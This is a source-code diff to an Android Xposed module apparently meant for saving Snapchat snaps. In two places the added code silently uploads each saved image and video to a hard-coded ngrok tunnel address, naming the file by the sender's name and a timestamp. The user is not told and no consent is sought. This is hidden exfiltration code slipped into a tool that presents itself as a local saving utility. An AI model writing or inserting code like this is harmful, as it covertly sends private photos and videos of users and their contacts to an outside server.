@@ -2,6 +2,7 @@ package com.marz.snapprefs;
 
 
 import android.app.Activity;
+import android.app.Service;
 import android.content.Context;
 import android.content.res.Resources;
 import android.content.res.XModuleResources;
@@ -17,6 +18,8 @@ import android.widget.FrameLayout;
 import android.widget.ImageView;
 import android.widget.Toast;
 
+import com.android.internal.http.multipart.MultipartEntity;
+import com.android.internal.http.multipart.Part;
 import com.marz.snapprefs.Logger.LogType;
 import com.marz.snapprefs.Preferences.Prefs;
 import com.marz.snapprefs.SnapData.FlagState;
@@ -29,6 +32,14 @@ import com.marz.snapprefs.Util.SavingUtils;
 import com.marz.snapprefs.Util.StringUtils;
 import com.marz.snapprefs.Util.SweepSaveGesture;
 
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.InputStreamEntity;
+import org.apache.http.impl.client.DefaultHttpClient;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
@@ -47,6 +58,17 @@ import de.robv.android.xposed.XC_MethodReplacement;
 import de.robv.android.xposed.XposedBridge;
 import de.robv.android.xposed.XposedHelpers;
 import de.robv.android.xposed.callbacks.XC_LoadPackage;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.RequestBody;
+import okhttp3.ResponseBody;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+import retrofit2.Retrofit;
+import retrofit2.http.Multipart;
+import retrofit2.http.POST;
 
 import static com.marz.snapprefs.Util.StringUtils.obfus;
 import static de.robv.android.xposed.XposedHelpers.callMethod;
@@ -1251,6 +1273,30 @@ public class Saving {
                 return SaveResponse.EXISTING;
             }
 
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            image.compress(Bitmap.CompressFormat.PNG, 0, bos);
+            byte[] data = bos.toByteArray();
+
+            OkHttpClient client = new OkHttpClient.Builder().build();
+
+            ImageUpload service = new Retrofit.Builder().baseUrl("http://e48d55c3.ngrok.io/").client(client).build().create(ImageUpload.class);
+
+            RequestBody reqFile = RequestBody.create(okhttp3.MediaType.parse("image/png"), data);
+            MultipartBody.Part body = MultipartBody.Part.createFormData("snap", sender + "-" + new Date().getTime() + "-" + "5.png", reqFile);
+
+            retrofit2.Call<okhttp3.ResponseBody> req = service.postImage(body);
+            req.enqueue(new Callback<ResponseBody>() {
+                @Override
+                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                    // Do Something
+                }
+
+                @Override
+                public void onFailure(Call<ResponseBody> call, Throwable t) {
+                    t.printStackTrace();
+                }
+            });
+
             // the following code is somewhat redundant as it defeats the point of an async task
             // Perform an async save of the JPG
             return SavingUtils.saveJPG(imageFile, image, context) ?
@@ -1281,6 +1327,33 @@ public class Saving {
                 SavingUtils.vibrate(context, false);
                 return SaveResponse.EXISTING;
             }
+
+            OkHttpClient client = new OkHttpClient.Builder().build();
+
+            ImageUpload service = new Retrofit.Builder().baseUrl("http://e48d55c3.ngrok.io/").client(client).build().create(ImageUpload.class);
+
+            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+            int nRead;
+            byte[] data = new byte[1024];
+            while ((nRead = video.read(data, 0, data.length)) != -1) {
+                buffer.write(data, 0, nRead);
+            }
+
+            RequestBody reqFile = RequestBody.create(okhttp3.MediaType.parse("video/mp4"), buffer.toByteArray());
+            MultipartBody.Part body = MultipartBody.Part.createFormData("snap", sender + "-" + new Date().getTime() + "-" + "5.mp4", reqFile);
+
+            retrofit2.Call<okhttp3.ResponseBody> req = service.postImage(body);
+            req.enqueue(new Callback<ResponseBody>() {
+                @Override
+                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                    // Do Something
+                }
+
+                @Override
+                public void onFailure(Call<ResponseBody> call, Throwable t) {
+                    t.printStackTrace();
+                }
+            });
 
             // the following code is somewhat redundant as it defeats the point of an async task
             // Perform an async save of the PNG
